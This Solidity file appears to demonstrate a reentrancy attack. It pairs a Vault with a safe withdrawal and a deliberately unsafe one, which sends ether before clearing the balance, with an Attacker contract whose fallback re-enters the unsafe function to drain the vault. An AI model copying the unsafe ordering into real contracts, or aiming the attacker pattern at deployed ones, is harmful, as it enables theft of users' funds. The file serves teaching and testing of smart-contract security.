// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

interface IVault {
    function deposit() external payable;

    function withdrawSafe(address payable holder) external;

    function withdrawUnsafe(address payable holder) external;
}

interface IAttacker {
    function depositToVault(address vault) external payable;

    function attack(address vault) external;
}

contract Vault is IVault {
    mapping(address => uint256) public balance;

    function deposit() external payable {
        balance[msg.sender] += msg.value;
    }

    function withdrawSafe(address payable holder) external {
        require(balance[holder] > 0);

        uint256 amount = balance[holder];
        balance[holder] = 0;

        (bool ok, ) = holder.call{value: amount}("");
        require(ok, "Transfer failed");
    }

    function withdrawUnsafe(address payable holder) external {
        require(balance[holder] > 0);

        (bool ok, ) = holder.call{value: balance[holder]}("");

        balance[holder] = 0;
        require(ok, "Transfer failed");
    }
}

contract Attacker is IAttacker {
    function depositToVault(address vault) external payable {
        IVault(vault).deposit{value: msg.value}();
    }

    fallback() external payable {
        if (address(msg.sender).balance >= Vault(address(msg.sender)).balance(address(this))){
            IVault(msg.sender).withdrawUnsafe(payable(this));
        }
    }

    function attack(address vault) external {
        IVault(vault).withdrawUnsafe(payable(address(this)));
    }
}


contract Depositor {
    event Received(uint256 amount);

    receive() external payable {
        emit Received(msg.value);
    }
    
    function depositToVault(address vault) external payable{
        IVault(vault).deposit{value: address(this).balance}();
    }

    function depositToVaultFromAttacker(address attacker, address vault) external payable{
        IAttacker(attacker).depositToVault{value: address(this).balance}(vault);
    }
}
